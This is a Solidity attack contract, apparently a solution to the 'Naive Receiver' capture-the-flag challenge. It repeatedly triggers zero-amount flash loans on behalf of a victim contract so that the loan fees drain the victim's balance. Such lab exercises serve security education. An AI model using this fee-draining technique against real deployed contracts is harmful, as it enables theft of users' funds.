
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract Attack {
    using Address for address payable;

    NaiveReceiverLenderPool private immutable pool;
    address private immutable owner;

    constructor(address payable poolAddress, address _owner) {
        pool = NaiveReceiverLenderPool(poolAddress);
        owner = _owner;
    }
    
    // @dev may fail due to out of gas
    function CallFlashLoan(address victim) external returns (bool){
        require(msg.sender == owner, "No call for you");

        while(address(victim).balance != 0) {
            if(gasleft() == 0) {
                return false;
            }
             pool.flashLoan(victim, 0);
        }
        return true;
        //  for (uint i = 0; i < 10; i++) {
        //    if(address(victim).balance == 0) {
        //     break;
        //    }
        //    pool.flashLoan(victim, 0);
        //  }
    }
}